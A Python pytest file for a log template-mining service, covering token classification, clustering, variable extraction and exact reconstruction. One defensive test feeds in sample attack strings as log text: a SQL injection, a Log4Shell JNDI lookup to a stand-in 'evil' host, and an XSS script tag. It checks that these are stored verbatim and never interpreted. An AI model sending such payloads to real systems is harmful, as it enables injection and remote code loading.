"""Template mining: deterministic, conservative, lossless-friendly."""
from datetime import datetime, timezone

import pytest

from app.services.templates.classify import classify_token, separators_for, tokenize
from app.services.templates.mining import MinedCluster, RecordRef, mine_lines


def _recs(lines, source="test"):
    return [
        RecordRef(ref_id=f"r{i}", source=source,
                  ts=datetime(2026, 9, 5, tzinfo=timezone.utc), raw=ln)
        for i, ln in enumerate(lines)
    ]


def _reconstruct(cluster: MinedCluster, raw: str) -> str:
    spans = tokenize(raw)
    tokens = [s.text for s in spans]
    seps, trailing = separators_for(raw, spans)
    variables = iter(cluster.extract_variables(tokens))
    parts = []
    for i, lit in enumerate(cluster.literals):
        parts.append(seps[i])
        parts.append(lit if lit is not None else next(variables))
    parts.append(trailing)
    return "".join(parts)


# --- classification ---

@pytest.mark.parametrize("token,expected", [
    ("192.168.1.50", "ipv4"),
    ("10.0.0.1:8080", "ipv4"),
    ("2001:0db8:85a3:0000:0000:8a2e:0370:7334", "ipv6"),
    ("fe80::1", "ipv6"),
    ("2026-09-05T09:02:11Z", "timestamp"),
    ("09:02:11", "timestamp"),
    ("a1b2c3d4-e5f6-7890-abcd-ef1234567890", "uuid"),
    ("00:16:3e:1a:2b:3c", "mac"),
    ("admin@corp.example", "email"),
    ("https://portal.example/x?y=1", "url"),
    ("d41d8cd98f00b204e9800998ecf8427e", "hash"),
    ("44210", "number"),
    ("-5", "number"),
    ("sshd", None),
    ("password", None),
])
def test_classify_token(token, expected):
    assert classify_token(token) == expected


def test_time_token_not_misread_as_ipv6():
    assert classify_token("08:07:13") == "timestamp"


# --- template generation + grouping + variable extraction ---

def test_canonical_example_not_hardcoded():
    clusters = mine_lines(_recs([
        "User admin logged in from 192.168.1.50",
        "User john logged in from 192.168.1.72",
        "User alice logged in from 192.168.1.90",
    ]))
    assert len(clusters) == 1
    c = clusters[0]
    assert c.pattern_text() == "User <*> logged in from <*>"
    assert c.occurrences == 3
    assert c.variable_count == 2
    toks = [s.text for s in tokenize("User admin logged in from 192.168.1.50")]
    assert c.extract_variables(toks) == ["admin", "192.168.1.50"]


def test_repeated_logs_group_and_rare_ones_do_not_merge():
    clusters = mine_lines(_recs(
        ["svc: request id=%d path=/api/v1/orders status=200" % i for i in range(20)]
        + ["svc: shutdown initiated by operator"]
    ))
    big = max(clusters, key=lambda c: c.occurrences)
    assert big.occurrences == 20
    assert any(c.occurrences == 1 and "shutdown" in c.pattern_text() for c in clusters)


def test_different_keywords_stay_separate():
    clusters = mine_lines(_recs(
        ["auth: Failed password for admin from 10.0.0.%d" % i for i in range(6)]
        + ["auth: Accepted password for admin from 10.0.0.%d" % i for i in range(6)]
    ))
    patterns = {c.pattern_text() for c in clusters}
    assert any("Failed password" in p for p in patterns)
    assert any("Accepted password" in p for p in patterns)
    assert not any("<*> password" in p for p in patterns)  # keyword not wildcarded


def test_does_not_collapse_everything_to_wildcards():
    clusters = mine_lines(_recs([
        f"nginx: {ip} GET /health 200 {n}"
        for ip, n in [("10.0.0.1", 12), ("10.0.0.2", 44), ("10.0.0.3", 7)]
    ]))
    c = clusters[0]
    assert "GET" in c.pattern_text() and "/health" in c.pattern_text()
    assert c.variable_count < c.token_count  # structure preserved


def test_template_id_determinism_and_signature_stability():
    a = mine_lines(_recs(["User u%d logged in from 10.0.0.%d" % (i, i) for i in range(5)]))
    b = mine_lines(_recs(["User u%d logged in from 10.0.0.%d" % (i, i) for i in range(5)]))
    assert [c.token_signature() for c in a] == [c.token_signature() for c in b]


def test_source_distribution():
    recs = _recs(["worker done job=%d" % i for i in range(3)], source="alpha")
    recs += _recs(["worker done job=%d" % i for i in range(2)], source="beta")
    clusters = mine_lines(recs)
    c = clusters[0]
    dist = {}
    for m in c.members:
        dist[m.source] = dist.get(m.source, 0) + 1
    assert dist == {"alpha": 3, "beta": 2}


# --- edge cases ---

def test_empty_dataset():
    assert mine_lines([]) == []
    assert mine_lines(_recs(["", "   ", "\t"])) == []


def test_malformed_and_mixed_records_do_not_crash():
    clusters = mine_lines(_recs([
        "{'broken json': ",
        "no structure at all here just words",
        "12345",
        "===========",
        "a\tb\t\tc   d",
    ]))
    assert isinstance(clusters, list)


def test_unicode_logs_reconstruct_exactly():
    lines = [
        "usuario café conectó desde 10.0.0.1",
        "usuario naïve conectó desde 10.0.0.2",
        "usuario 日本語 conectó desde 10.0.0.3",
    ]
    clusters = mine_lines(_recs(lines))
    for c in clusters:
        for m in c.members:
            assert _reconstruct(c, m.raw) == m.raw


def test_long_line_reconstructs_exactly():
    long_line = "event " + " ".join(f"k{i}=v{i}" for i in range(400)) + " end"
    clusters = mine_lines(_recs([long_line, long_line.replace("v1", "vX")]))
    for c in clusters:
        for m in c.members:
            assert _reconstruct(c, m.raw) == m.raw


def test_special_chars_and_odd_whitespace_reconstruct_exactly():
    lines = [
        'weird\ttext  with   "quotes" and ${vars} and 10.0.0.1',
        'weird\ttext  with   "quotes" and ${vars} and 10.0.0.2',
        "trailing spaces here   ",
        "  leading spaces 10.0.0.9",
    ]
    for c in mine_lines(_recs(lines)):
        for m in c.members:
            assert _reconstruct(c, m.raw) == m.raw


def test_attacker_controlled_strings_are_only_text():
    lines = [
        'req path=/x q="1\' OR 1=1;-- " ua=curl from 10.0.0.1',
        'req path=/y q="${jndi:ldap://evil/x}" ua=curl from 10.0.0.2',
        'req path=/z q="<script>alert(1)</script>" ua=curl from 10.0.0.3',
    ]
    clusters = mine_lines(_recs(lines))
    for c in clusters:
        # payload text appears verbatim as a variable, never interpreted
        for m in c.members:
            assert _reconstruct(c, m.raw) == m.raw
    joined = " ".join(c.pattern_text() for c in clusters)
    assert "jndi" not in joined or "<*>" in joined  # payload lives in a variable slot
